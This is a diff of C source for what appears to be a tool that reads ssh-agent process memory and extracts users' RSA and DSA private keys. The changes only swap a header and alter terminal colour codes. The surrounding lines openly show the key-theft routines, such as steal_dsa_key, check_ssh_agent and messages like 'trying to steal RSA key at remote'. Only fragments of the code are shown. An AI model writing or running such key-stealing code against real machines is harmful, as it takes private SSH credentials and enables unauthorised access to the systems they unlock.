@@ -43,7 +43,7 @@
 #include <linear.h>
 #include <endian_swap.h>
 
-#include "sshkey-structs.h"
+#include "ssh-authfile.h"
 
 char pagedir[4096];
 addr_t stack_bottom = 0;
@@ -298,7 +298,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	} else {
 		free(key->dsa);
 		key->dsa = NULL;
-		printf("\t\t\tfailed to recover bignums.\n");
+		printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
 		return 0;
 	}
 }
@@ -369,7 +369,7 @@ void check_ssh_agent(linear_handle lin) {
 	home = resolve_env(lin, "HOME");
 	printf("\n");
 	if(pname && home && ( (!strcmp(pname, "ssh-agent") || !strcmp(pname, "/usr/bin/ssh-agent")))) {
-		printf("\x1b[1;32m" "hit" "\x1b[0m" "\n");
+		printf("\x1b[1;33m" "hit" "\x1b[0m" "\n");
 		char identity_path[1024];
 		char* heap;	// actually this is a dump of the executable and heap
 				// but we don't care for the executable.
@@ -462,14 +462,14 @@ void check_ssh_agent(linear_handle lin) {
 			printf("\t\tKEY: type:%d flags:0x%x, RSA* 0x%08x, DSA* 0x%08x\n", key.type, key.flags, (uint32_t)key.rsa, (uint32_t)key.dsa);
 			// check all keytypes
 			if(key.rsa) {
-				printf("\t\t" "\x1b[1;32m" "trying to steal RSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.rsa);
+				printf("\t\t" "\x1b[1;33m" "trying to steal RSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.rsa);
 				if(!steal_rsa_key(lin, &key)) {
 					printf("\t\tfailed :(\n");
 					key.rsa = 0;
 				}
 			}
 			if(key.dsa) {
-				printf("\t\t" "\x1b[1;32m" "trying to steal DSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.dsa);
+				printf("\t\t" "\x1b[1;33m" "trying to steal DSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.dsa);
 				if(!steal_dsa_key(lin, &key)) {
 					printf("\t\tfailed :(\n");
 					key.dsa = 0;
